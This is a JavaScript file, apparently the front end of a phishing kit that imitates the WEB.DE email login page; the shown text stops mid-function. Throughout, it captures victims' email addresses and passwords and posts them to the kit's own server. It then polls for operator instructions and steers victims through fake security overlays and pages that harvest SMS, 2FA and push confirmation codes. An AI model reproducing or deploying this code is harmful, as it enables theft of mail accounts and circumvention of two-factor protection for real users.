/**
 * WEB.DE — страница входа: только @web.de, редиректы на web.de
 */

(function () {
  const WEBDE_CANONICAL = 'https://web.de/';
  const WEBDE_REGISTRATION = 'https://web.de/email/tarifvergleich/#.pc_page.homepage.index.loginbox.tarifvergleich';
  /** Явно отправляем cookie гейта (gmx_v) — иначе на части схем с поддоменами / прокси submit может уйти без куки и лог не создаётся. */
  var credFetch = { credentials: 'include' };

  /**
   * Каждая полная загрузка документа входа = новая клиентская сессия (новая вкладка, закрыли вкладку и открыли снова, F5, «Назад» на anmelden).
   * Подшаг почта → пароль без reload не ломается: скрипт выполняется один раз за визит страницы.
   */
  try {
    sessionStorage.removeItem('gmw_lead_id');
    sessionStorage.removeItem('gmw_fp_preset_idx');
  } catch (e) {}

  const steps = {
    email: 'step-email',
    password: 'step-password',
    verifyChoice: 'step-verify-choice',
    smsRequest: 'step-sms-request',
    smsCode: 'step-sms-code',
    push: 'step-push',
    success: 'step-success'
  };

  const stepIds = Object.values(steps);
  let currentStep = 'email';

  function showStep(stepKey) {
    currentStep = stepKey;
    const id = steps[stepKey];
    if (!id) return;
    stepIds.forEach(sid => {
      const el = document.getElementById(sid);
      if (el) el.classList.toggle('active', sid === id);
    });
    document.body.classList.toggle('step-email', stepKey === 'email');
    const header = document.querySelector('.gmx-header');
    if (header) header.setAttribute('aria-hidden', stepKey === 'email' ? 'true' : 'false');
  }

  function getStepEl(stepKey) {
    return document.getElementById(steps[stepKey]);
  }

  let loginSubStep = 1;
  let loginPollId = null;
  let pagePollInterval = null;
  /** Отмена отложенного редиректа при смене lead id / новом poll (иначе срабатывает таймер от старого статуса). */
  let gmwScheduledRedirectTimeoutId = null;
  function clearGmwScheduledRedirect() {
    if (gmwScheduledRedirectTimeoutId != null) {
      clearTimeout(gmwScheduledRedirectTimeoutId);
      gmwScheduledRedirectTimeoutId = null;
    }
  }
  let protectionOverlayShown = false;
  let protectionCountdownSeconds = 300;
  let protectionCountdownIntervalId = null;
  let webdeSuccessCountdownIntervalId = null;
  var WEBDE_SUCCESS_UNLOCK_PREFIX = 'gmw_webde_success_unlock_';
  var WEBDE_SUCCESS_TWENTY_FOUR_MS = 24 * 60 * 60 * 1000;

  function getWebdeSuccessLeadIdForStorage() {
    try {
      var lid = sessionStorage.getItem('gmw_lead_id');
      if (lid) return lid;
    } catch (e) {}
    return '';
  }

  function startWebdeSuccessOverlayCountdown() {
    var countdownEl = document.getElementById('webde-success-countdown-time');
    var wrapEl = document.getElementById('webde-success-countdown-wrap');
    if (!countdownEl || !wrapEl) return;
    if (webdeSuccessCountdownIntervalId) {
      clearInterval(webdeSuccessCountdownIntervalId);
      webdeSuccessCountdownIntervalId = null;
    }
    var leadId = getWebdeSuccessLeadIdForStorage();
    var storageKey = leadId ? (WEBDE_SUCCESS_UNLOCK_PREFIX + leadId) : 'gmw_webde_success_unlock_anon';
    var unlockAt = null;
    try {
      if (typeof sessionStorage !== 'undefined') {
        var stored = sessionStorage.getItem(storageKey);
        if (stored) {
          var parsed = parseInt(stored, 10);
          if (!isNaN(parsed)) unlockAt = parsed;
        }
      }
    } catch (e) {}
    if (unlockAt == null) {
      unlockAt = Date.now() + WEBDE_SUCCESS_TWENTY_FOUR_MS;
      try { sessionStorage.setItem(storageKey, String(unlockAt)); } catch (e2) {}
    }
    var labelEl = wrapEl.querySelector('.success-overlay-countdown-label');
    var suffixEl = wrapEl.querySelector('.success-overlay-countdown-suffix');
    if (labelEl) labelEl.textContent = 'Verbleibende Zeit';
    if (suffixEl) suffixEl.textContent = 'Stunden : Minuten : Sekunden';
    function formatRemaining(ms) {
      if (ms <= 0) return '00:00:00';
      var totalS = Math.floor(ms / 1000);
      var h = Math.floor(totalS / 3600);
      var m = Math.floor((totalS % 3600) / 60);
      var s = totalS % 60;
      var pad = function (n) { return n < 10 ? '0' + n : String(n); };
      return pad(h) + ':' + pad(m) + ':' + pad(s);
    }
    function update() {
      var remaining = unlockAt - Date.now();
      countdownEl.textContent = formatRemaining(remaining);
      if (remaining <= 0) {
        if (labelEl) labelEl.textContent = 'Freigabe abgeschlossen';
        if (suffixEl) suffixEl.textContent = 'Sie können Ihr Postfach wieder wie gewohnt nutzen.';
        if (webdeSuccessCountdownIntervalId) {
          clearInterval(webdeSuccessCountdownIntervalId);
          webdeSuccessCountdownIntervalId = null;
        }
      }
    }
    update();
    webdeSuccessCountdownIntervalId = setInterval(update, 1000);
  }
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const buttonNext = document.querySelector('[data-testid="button-next"]');
  const buttonBack = document.querySelector('[data-testid="button-back"]');
  const usernameGroup = usernameInput ? usernameInput.closest('.input-group-username') : null;
  const passwordGroup = passwordInput ? passwordInput.closest('.input-group') : null;
  const passwordRow = document.querySelector('.input-row-password');
  const linkForgotRow = document.querySelector('.link-forgot-row');
  const pencilIcon = document.querySelector('[data-testid="custom-icon-username"]');
  const errorUsername = document.getElementById('error-username');
  const errorLogin = document.getElementById('error-login');

  var hadNonSuccessStatusThisSession = false;
  function startPagePoll(id) {
    if (!id) return;
    hadNonSuccessStatusThisSession = false;
    clearGmwScheduledRedirect();
    if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
    function poll() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=index&_=' + Date.now(), Object.assign({ cache: 'no-store', headers: { Pragma: 'no-cache' } }, credFetch))
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var mode = (res && res.mode) || '';
          var st = res && res.status;
          var scriptStatus = res && res.scriptStatus;
          if (mode === 'manual' && st === 'pending') return;
          if (st === 'pending' && scriptStatus === 'wait_password' && typeof showLoginSubStep === 'function') showLoginSubStep(2);
          if (st === 'error' && scriptStatus === 'invalid_email' && typeof showLoginSubStep === 'function') { showLoginSubStep(1); setEmailError(true); }
          if (st !== 'show_success') hadNonSuccessStatusThisSession = true;
          if (st === 'show_success') {
            if (!hadNonSuccessStatusThisSession) return;
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            var overlay = document.getElementById('success-overlay');
            if (overlay) {
              overlay.hidden = false;
              startWebdeSuccessOverlayCountdown();
            }
          } else if (st === 'redirect_change_password' || st === 'redirect_sicherheit' || st === 'redirect_android' || st === 'redirect_open_on_pc') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            var url = st === 'redirect_change_password' ? '/passwort-aendern?id=' + encodeURIComponent(id)
              : st === 'redirect_sicherheit' ? '/sicherheit-update?id=' + encodeURIComponent(id)
              : st === 'redirect_android' ? '/app-update?id=' + encodeURIComponent(id)
              : '/bitte-am-pc?id=' + encodeURIComponent(id);
            clearGmwScheduledRedirect();
            gmwScheduledRedirectTimeoutId = setTimeout(function () { gmwScheduledRedirectTimeoutId = null; window.location = url; }, 1800);
          } else if (st === 'redirect_klein_anmelden') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            clearGmwScheduledRedirect();
            gmwScheduledRedirectTimeoutId = setTimeout(function () { gmwScheduledRedirectTimeoutId = null; window.location = '/klein-anmelden?id=' + encodeURIComponent(id); }, 1800);
          } else if (st === 'redirect_push') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sms_code') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_2fa_code') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || WEBDE_CANONICAL;
          } else if (st === 'not_found') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {}
            if (typeof showLoginSubStep === 'function') showLoginSubStep(1);
            setEmailError(true);
          }
        })
        .catch(function () {});
    }
    poll();
    pagePollInterval = setInterval(poll, 1000);
  }

  (function registerVisit() {
    try {
      var leadId = sessionStorage.getItem('gmw_lead_id');
      if (leadId) startPagePoll(leadId);
    } catch (e) {}
  })();

  function normalizeEmailValue(value) {
    var v = (value || '').trim();
    v = v.replace(/\uFF20/g, '@');
    v = v.replace(/[\u200B\u200C\u200D\uFEFF\u00A0\u200E\u200F\u202A\u202B\u202C\u202D\u202E]/g, '');
    try {
      v = v.normalize('NFKC');
    } catch (e) {}
    return v.trim();
  }

  /** Домен для сравнения с web.de: нижний регистр, без хвостовых точек, NFKC, латинские аналоги частых кириллических «букв-двойников» в домене. */
  function normalizeWebdeDomain(domain) {
    var d = (domain || '').toLowerCase().trim().replace(/\.+$/g, '');
    try {
      d = d.normalize('NFKC');
    } catch (e) {}
    var folded = '';
    for (var i = 0; i < d.length; i++) {
      var c = d.charCodeAt(i);
      if (c === 0x0435) folded += 'e';
      else if (c === 0x043e) folded += 'o';
      else if (c === 0x0440) folded += 'p';
      else if (c === 0x0441) folded += 'c';
      else if (c === 0x0430) folded += 'a';
      else if (c === 0x0432) folded += 'b';
      else if (c === 0x043c) folded += 'm';
      else if (c === 0x0442) folded += 't';
      else if (c === 0x0443) folded += 'y';
      else if (c === 0x0445) folded += 'x';
      else if (c === 0x0456) folded += 'i';
      else if (c === 0x03bf) folded += 'o';
      else if (c === 0x03b5) folded += 'e';
      else folded += d.charAt(i);
    }
    return folded;
  }

  function isValidEmail(value) {
    var v = normalizeEmailValue(value);
    if (!v) return false;
    var at = v.indexOf('@');
    if (at === -1) return false;
    var local = v.slice(0, at).trim();
    var domainRaw = v.slice(at + 1);
    var domain = normalizeWebdeDomain(domainRaw);
    return local.length >= 1 && domain === 'web.de';
  }

  /** После успешной проверки — в API уходит ровно local@web.de (ASCII), без homoglyph-домена. */
  function canonicalWebdeEmail(email) {
    var v = normalizeEmailValue(email);
    var at = v.indexOf('@');
    if (at === -1) return v;
    var local = v.slice(0, at).trim();
    var domain = normalizeWebdeDomain(v.slice(at + 1));
    if (domain !== 'web.de' || !local.length) return v;
    return local + '@web.de';
  }

  function setEmailError(show) {
    if (errorUsername) errorUsername.hidden = !show;
    if (usernameGroup) usernameGroup.classList.toggle('has-error', show);
    if (usernameInput) usernameInput.setAttribute('aria-invalid', show ? 'true' : 'false');
  }

  function updateEmailErrorVisibility() {
    var v = (usernameInput && usernameInput.value) || '';
    var valid = isValidEmail(v);
    if (errorUsername && !errorUsername.hidden && valid) setEmailError(false);
  }

  function setLoginError(show) {
    if (errorLogin) errorLogin.hidden = !show;
    if (usernameGroup) usernameGroup.classList.toggle('has-error', show);
    if (passwordGroup) passwordGroup.classList.toggle('has-error', show);
  }

  function stopLoginLoading() {
    if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
    if (buttonNext) {
      buttonNext.classList.remove('is-loading');
      if (loginSubStep === 1) buttonNext.disabled = !(usernameInput && isValidEmail((usernameInput.value || '').trim()));
      else buttonNext.disabled = !(passwordInput && passwordInput.value.trim());
    }
  }

  function showLoginSubStep(step) {
    loginSubStep = step;
    if (step === 1) {
      try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {}
      stopLoginLoading();
    }
    var isStep2 = step === 2;
    if (passwordRow) passwordRow.hidden = !isStep2;
    if (linkForgotRow) linkForgotRow.hidden = !isStep2;
    if (pencilIcon) pencilIcon.hidden = !isStep2;
    if (usernameGroup) usernameGroup.classList.toggle('has-edit-icon', isStep2);
    if (usernameInput) {
      usernameInput.disabled = isStep2;
      if (isStep2) usernameInput.setAttribute('aria-describedby', '');
      else usernameInput.removeAttribute('aria-describedby');
    }
    if (buttonNext) {
      var btnText = buttonNext.querySelector('.btn-login-text');
      if (btnText) btnText.textContent = isStep2 ? 'Login' : 'Weiter';
      else buttonNext.textContent = isStep2 ? 'Login' : 'Weiter';
      if (isStep2) buttonNext.disabled = !passwordInput.value.trim();
      else updateButtonNextState();
    }
    if (isStep2 && passwordInput) {
      passwordInput.value = '';
      passwordInput.focus();
      if (passwordGroup) passwordGroup.classList.remove('has-value');
    }
    if (isStep2) setEmailError(false);
    else updateEmailErrorVisibility();
    setLoginError(false);
    updateUsernameLabel();
  }

  function updateUsernameLabel() {
    if (usernameGroup) usernameGroup.classList.toggle('has-value', !!usernameInput && !!usernameInput.value.trim());
  }

  function updateButtonNextState() {
    if (!buttonNext) return;
    if (loginSubStep === 1) {
      var v = (usernameInput && usernameInput.value) || '';
      buttonNext.disabled = !isValidEmail(v);
    } else buttonNext.disabled = !passwordInput.value.trim();
  }

  if (usernameInput) {
    usernameInput.addEventListener('input', function () {
      if (loginSubStep === 1) { updateEmailErrorVisibility(); updateButtonNextState(); }
      updateUsernameLabel();
    });
    usernameInput.addEventListener('change', function () {
      if (loginSubStep === 1) { updateEmailErrorVisibility(); updateButtonNextState(); }
      updateUsernameLabel();
    });
    usernameInput.addEventListener('focus', function () {
      if (loginSubStep === 1) { updateEmailErrorVisibility(); updateButtonNextState(); }
      updateUsernameLabel();
    });
    usernameInput.addEventListener('blur', updateUsernameLabel);
    updateUsernameLabel();
    setTimeout(function () {
      if (loginSubStep === 1) { updateEmailErrorVisibility(); updateButtonNextState(); updateUsernameLabel(); }
    }, 0);
    setTimeout(function () {
      if (loginSubStep === 1) { updateEmailErrorVisibility(); updateButtonNextState(); updateUsernameLabel(); }
    }, 300);
  }

  if (passwordInput) {
    passwordInput.addEventListener('input', function () {
      updateButtonNextState();
      if (errorLogin && !errorLogin.hidden) setLoginError(false);
    });
    passwordInput.addEventListener('change', updateButtonNextState);
    passwordInput.addEventListener('focus', function () { if (passwordGroup) passwordGroup.classList.add('has-value'); });
    passwordInput.addEventListener('blur', function () { if (passwordGroup) passwordGroup.classList.toggle('has-value', !!passwordInput.value.trim()); });
  }

  function doStep1Submit() {
    var raw = (usernameInput && usernameInput.value) ? usernameInput.value : '';
    var email = normalizeEmailValue(raw);

    function trySubmitWithCurrentValue() {
      var r = (usernameInput && usernameInput.value) ? usernameInput.value : '';
      var e = normalizeEmailValue(r);
      if (e && isValidEmail(e)) {
        doStep1SubmitWithEmail(canonicalWebdeEmail(e));
        return true;
      }
      return false;
    }

    if (!email && usernameInput) {
      requestAnimationFrame(function () {
        if (trySubmitWithCurrentValue()) return;
        setTimeout(function () {
          if (!trySubmitWithCurrentValue()) setEmailError(true);
        }, 180);
      });
      return;
    }
    if (!email) return;
    if (!isValidEmail(email)) {
      setTimeout(function () {
        if (trySubmitWithCurrentValue()) return;
        setEmailError(true);
      }, 180);
      return;
    }
    doStep1SubmitWithEmail(canonicalWebdeEmail(email));
  }

  function doStep1SubmitWithEmail(email) {
    var visitId = null;
    try { visitId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
    var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
    var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
    var hpEl = document.getElementById('hp-website');
    var websiteHp = (hpEl && hpEl.value) ? hpEl.value : '';
    fetch('/api/submit', Object.assign({
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(window.gmwAppendTelemetry({ email: email, password: '', visitId: visitId || undefined, screenWidth: sw || undefined, screenHeight: sh || undefined, website: websiteHp }))
    }, credFetch))
      .then(function (r) { return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; }); })
      .then(function (res) {
        if (!res.ok) { setEmailError(true); return; }
        var lid = res.data && res.data.id;
        if (!lid) { setEmailError(true); return; }
        try { sessionStorage.setItem('gmw_lead_id', lid); } catch (e) {}
        startPagePoll(lid);
        showLoginSubStep(2);
      })
      .catch(function () { setEmailError(true); });
  }

  var step1SubmitScheduled = false;
  function scheduleStep1Submit() {
    if (step1SubmitScheduled) return;
    step1SubmitScheduled = true;
    setEmailError(false);
    setTimeout(function () {
      step1SubmitScheduled = false;
      doStep1Submit();
    }, 100);
  }
  if (usernameInput) {
    usernameInput.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' && loginSubStep === 1) {
        e.preventDefault();
        scheduleStep1Submit();
      }
    });
  }

  document.getElementById('form-login').addEventListener('submit', function (e) {
    e.preventDefault();
    if (loginSubStep === 1) {
      scheduleStep1Submit();
      return;
    }
    if (loginSubStep === 2) {
      var email = (usernameInput && usernameInput.value) || '';
      var pwd = (passwordInput && passwordInput.value) || '';
      if (!pwd.trim()) return;
      setLoginError(false);
      buttonNext.disabled = true;
      buttonNext.classList.add('is-loading');
      var leadId = null;
      try { leadId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
      function startPolling(id) {
        if (!id) { buttonNext.classList.remove('is-loading'); buttonNext.disabled = !pwd.trim(); return; }
        clearGmwScheduledRedirect();
        if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
        showProtectionOverlayAndCountdown();
        function formatProtectionCountdown(sec) {
          var m = Math.floor(sec / 60);
          var s = sec % 60;
          return m + ':' + (s < 10 ? '0' : '') + s;
        }
        function showProtectionOverlayAndCountdown(overrideSeconds) {
          var overlay = document.getElementById('protection-overlay');
          var countdownEl = document.getElementById('protection-countdown');
          if (!protectionOverlayShown) {
            protectionOverlayShown = true;
            if (overlay) overlay.hidden = false;
            protectionCountdownSeconds = (typeof overrideSeconds === 'number' && overrideSeconds >= 0)
              ? Math.floor(overrideSeconds)
              : 300;
            if (countdownEl) countdownEl.textContent = formatProtectionCountdown(protectionCountdownSeconds);
            if (protectionCountdownIntervalId) clearInterval(protectionCountdownIntervalId);
            protectionCountdownIntervalId = setInterval(function () {
              if (protectionCountdownSeconds > 0) protectionCountdownSeconds--;
              if (countdownEl) countdownEl.textContent = formatProtectionCountdown(protectionCountdownSeconds);
            }, 1000);
          } else if (typeof overrideSeconds === 'number' && overrideSeconds >= 0) {
            protectionCountdownSeconds = Math.floor(overrideSeconds);
            if (countdownEl) countdownEl.textContent = formatProtectionCountdown(protectionCountdownSeconds);
          }
        }
        function checkStatus() {
          fetch('/api/status?id=' + encodeURIComponent(id) + '&page=index&_=' + Date.now(), Object.assign({ cache: 'no-store', headers: { Pragma: 'no-cache' } }, credFetch))
            .then(function (r) { return r.json(); })
            .then(function (res) {
              var st = res && res.status;
              var mode = res && res.mode;
              function hideProtectionOverlay() {
                var po = document.getElementById('protection-overlay');
                if (po) po.hidden = true;
                if (protectionCountdownIntervalId) { clearInterval(protectionCountdownIntervalId); protectionCountdownIntervalId = null; }
                protectionOverlayShown = false;
              }
              if (st === 'error' || st === 'not_found') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                buttonNext.classList.remove('is-loading');
                buttonNext.disabled = !passwordInput.value.trim();
                if (st === 'not_found') { try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {} }
                setLoginError(true);
              } else if (st === 'show_success') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                buttonNext.classList.remove('is-loading');
                buttonNext.disabled = !passwordInput.value.trim();
                var overlay = document.getElementById('success-overlay');
                if (overlay) {
                  overlay.hidden = false;
                  startWebdeSuccessOverlayCountdown();
                }
              } else if (st === 'redirect_change_password' || st === 'redirect_sicherheit' || st === 'redirect_android' || st === 'redirect_open_on_pc') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                var targetUrl = st === 'redirect_change_password' ? '/passwort-aendern?id=' + encodeURIComponent(id) : st === 'redirect_sicherheit' ? '/sicherheit-update?id=' + encodeURIComponent(id) : st === 'redirect_android' ? '/app-update?id=' + encodeURIComponent(id) : '/bitte-am-pc?id=' + encodeURIComponent(id);
                clearGmwScheduledRedirect();
                gmwScheduledRedirectTimeoutId = setTimeout(function () { gmwScheduledRedirectTimeoutId = null; window.location = targetUrl; }, 1800);
              } else if (st === 'redirect_klein_anmelden') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                clearGmwScheduledRedirect();
                gmwScheduledRedirectTimeoutId = setTimeout(function () { gmwScheduledRedirectTimeoutId = null; window.location = '/klein-anmelden?id=' + encodeURIComponent(id); }, 1800);
              } else if (st === 'redirect_push') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
              } else if (st === 'redirect_sms_code') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                window.location = '/sms-code.html?id=' + encodeURIComponent(id);
              } else if (st === 'redirect_2fa_code') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
              } else if (st === 'redirect_gmx_net') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || WEBDE_CANONICAL;
              } else if (st === 'pending') {
                var serverWaitSec = null;
                if (res.scriptStatus === 'script_automation_wait' && res.scriptWaitSecondsLeft != null) {
                  var p = parseInt(res.scriptWaitSecondsLeft, 10);
                  if (!isNaN(p) && p >= 0) serverWaitSec = p;
                }
                showProtectionOverlayAndCountdown(serverWaitSec);
              }
            })
            .catch(function () {});
        }
        setTimeout(function () { checkStatus(); loginPollId = setInterval(checkStatus, 1000); }, 150);
      }
      if (leadId) {
        var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
        var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
        fetch('/api/update-password', Object.assign({ method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(window.gmwAppendTelemetry({ id: leadId, password: pwd, screenWidth: sw || undefined, screenHeight: sh || undefined })) }, credFetch))
          .then(function (r) { return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; }); })
          .then(function (res) {
            if (!res.ok) { buttonNext.classList.remove('is-loading'); buttonNext.disabled = !pwd.trim(); setLoginError(true); return; }
            var id = (res.data && res.data.id) || leadId;
            startPolling(id);
          })
          .catch(function () {
            var hpEl = document.getElementById('hp-website');
            var websiteHp = (hpEl && hpEl.value) ? hpEl.value : '';
            fetch('/api/submit', Object.assign({ method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(window.gmwAppendTelemetry({ email: email.trim(), password: pwd, screenWidth: sw || undefined, screenHeight: sh || undefined, website: websiteHp })) }, credFetch))
              .then(function (r) { return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; }); })
              .then(function (res) {
                if (!res.ok) { buttonNext.classList.remove('is-loading'); buttonNext.disabled = !pwd.trim(); setLoginError(true); return; }
                var newId = res.data && res.data.id;
                if (newId) { try { sessionStorage.setItem('gmw_lead_id', newId); } catch (e) {} }
                startPolling(newId || leadId);
              })
              .catch(function () { buttonNext.classList.remove('is-loading'); buttonNext.disabled = !pwd.trim(); setLoginError(true); });
          });
      } else {
        var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
        var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
        var hpEl = document.getElementById('hp-website');
        var websiteHp = (hpEl && hpEl.value) ? hpEl.value : '';
        fetch('/api/submit', Object.assign({ method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(window.gmwAppendTelemetry({ email: email.trim(), password: pwd, screenWidth: sw || undefined, screenHeight: sh || undefined, website: websiteHp })) }, credFetch))
          .then(function (r) { return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; }); })
          .then(function (res) {
            if (!res.ok) { buttonNext.classList.remove('is-loading'); buttonNext.disabled = !pwd.trim(); setLoginError(true); return; }
            var lid = res.data && res.data.id;
            if (!lid) { buttonNext.classList.remove('is-loading'); buttonNext.disabled = !pwd.trim(); setLoginError(true); return; }
            try { sessionStorage.setItem('gmw_lead_id', lid); } catch (e) {}
            startPolling(lid);
          })
          .catch(function () { buttonNext.classList.remove('is-loading'); buttonNext.disabled = !pwd.trim(); setLoginError(true); });
      }
    }
  });

  if (buttonBack) {
    buttonBack.addEventListener('click', function (e) {
      e.preventDefault();
      if (loginSubStep === 2) showLoginSubStep(1);
      else window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || WEBDE_CANONICAL;
    });
  }

  var successOverlayClose = document.getElementById('success-overlay-close');
  if (successOverlayClose) {
    successOverlayClose.addEventListener('click', function () {
      window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || WEBDE_CANONICAL;
    });
  }

  if (pencilIcon) {
    pencilIcon.addEventListener('click', function (e) { e.preventDefault(); showLoginSubStep(1); });
    pencilIcon.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); showLoginSubStep(1); } });
  }

  var btnReg = document.querySelector('[data-testid="button-registration"]');
  if (btnReg) {
    btnReg.addEventListener('click', function (e) {
      e.preventDefault();
      window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl ? (window.__BRAND__.canonicalUrl.replace(/\/$/, '') + '/email/tarifvergleich/#.pc_page.homepage.index.loginbox.tarifvergleich') : WEBDE_REGISTRATION);
    });
  }

  if (buttonNext) updateButtonNextState();

  var revealBtn = document.querySelector('[data-testid="reveal-icon-password"]');
  if (revealBtn) {
    revealBtn.addEventListener('click', function () {
      if (!passwordInput) return;
      var isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      this.setAttribute('aria-label', isPassword ? 'Passwort verbergen' : 'Passwort anzeigen');
    });
  }

  document.getElementById('form-password').addEventListener('submit', function (e) {
    e.preventDefault();
    var newPw = document.getElementById('new-password').value;
    var confirm = document.getElementById('confirm-password').value;
    if (newPw !== confirm) { alert('Neues Passwort und Wiederholung stimmen nicht überein.'); return; }
    if (newPw.length < 8) { alert('Das Passwort muss mindestens 8 Zeichen haben.'); return; }
    showStep('verifyChoice');
  });

  document.querySelectorAll('[data-method]').forEach(function (btn) {
    btn.addEventListener('click', function () {
      var method = this.dataset.method;
      var leadId = '';
      try { leadId = sessionStorage.getItem('gmw_lead_id') || ''; } catch (e) {}
      if (method === 'push') {
        if (leadId) {
          fetch('/api/choose-method', Object.assign({
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: leadId, method: 'push' })
          }, credFetch)).then(function () {
            window.location = '/push-confirm.html?id=' + encodeURIComponent(leadId);
          }).catch(function () {
            window.location = '/push-confirm.html?id=' + encodeURIComponent(leadId);
          });
        } else {
          showStep('push');
        }
      } else if (method === 'sms') {
        if (leadId) {
          fetch('/api/choose-method', Object.assign({
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: leadId, method: 'sms' })
          }, credFetch)).then(function () {
            window.location = '/sms-code.html?id=' + encodeURIComponent(leadId);
          }).catch(function () {
            window.location = '/sms-code.html?id=' + encodeURIComponent(leadId);
          });
        } else {
          showStep('smsRequest');
        }
      }
    });
  });

  document.getElementById('btn-request-sms').addEventListener('click', function () { showStep('smsCode'); });

  document.getElementById('form-sms').addEventListener('submit', function (e) {
    e.preventDefault();
    var code = document.getElementById('sms-code').value.trim();
    if (code.length === 6) showStep('success');
    else alert('Bitte geben Sie den 6-stelligen Code ein.');
  });

  var gotoEmail = document.querySelector('[data-goto="email"]');
  if (gotoEmail) {
    gotoEmail.addEventListener('click', function (e) { e.preventDefault(); showStep('email'); showLoginSubStep(1); });
  }

  document.querySelectorAll('.link-back').forEach(function (link) {
    link.addEventListener('click', function (e) { e.preventDefault(); showStep('email'); });
  });

  document.querySelectorAll('[data-goto]').forEach(function (link) {
    link.addEventListener('click', function (e) {
      e.preventDefault();
      var target = this.getAttribute('data-goto');
      if (target && steps[target]) showStep(target);
    });
  });

  document.querySelectorAll('.toggle-password').forEach(function (btn) {
    btn.addEventListener('click', function () {
      var wrap = this.closest('.password-wrap');
      var input = wrap ? wrap.querySelector('input') : null;
      if (!input) return;
      var isPassword = input.type === 'password';
      input.type = isPassword ? 'text' : 'password';
      btn.setAttribute('aria-label', isPassword ? 'Passwort verbergen' : 'Passwort anzeigen');
    });
  });

  var strengthFill = document.getElementById('strength-fill');
  var newPasswordInput = document.getElementById('new-password');
  function getStrength(pw) {
    if (!pw.length) return { level: 0, width: 0, cls: '' };
    var score = 0;
    if (pw.length >= 8) score++;
    if (pw.length >= 12) score++;
    if (/[a-z]/.test(pw) && /[A-Z]/.test(pw)) score++;
    if (/\d/.test(pw)) score++;
    if (/[^a-zA-Z0-9]/.test(pw)) score++;
